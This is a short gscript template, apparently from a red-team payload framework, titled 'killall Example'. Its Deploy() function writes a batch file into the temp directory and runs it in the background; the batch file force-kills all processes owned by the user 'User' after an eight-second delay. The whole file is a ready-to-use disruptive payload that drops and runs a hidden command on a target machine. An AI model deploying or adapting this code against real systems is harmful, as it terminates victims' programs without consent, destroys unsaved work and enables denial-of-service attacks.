// Example gscript template
// Title: killall Example
// Author: ahhh
// Purpose: Drops killall as an asset and executes it async
// Gscript version: 1.0.0
// ATT&CK: 

//priority:450
//timeout:550

//go_import:os as os2

function Deploy() {  
	
    // Run payload
    var temppath = os2.TempDir();
    var error4 = G.file.WriteFileFromString(temppath+"\\killall.bat", 'sleep 8 && TASKKILL /FI "USERNAME eq User" /F');
    var running = G.exec.ExecuteCommandAsync(temppath+"\\killall.bat", [""]);
    console.log("errors: "+running[1]);

    return true
}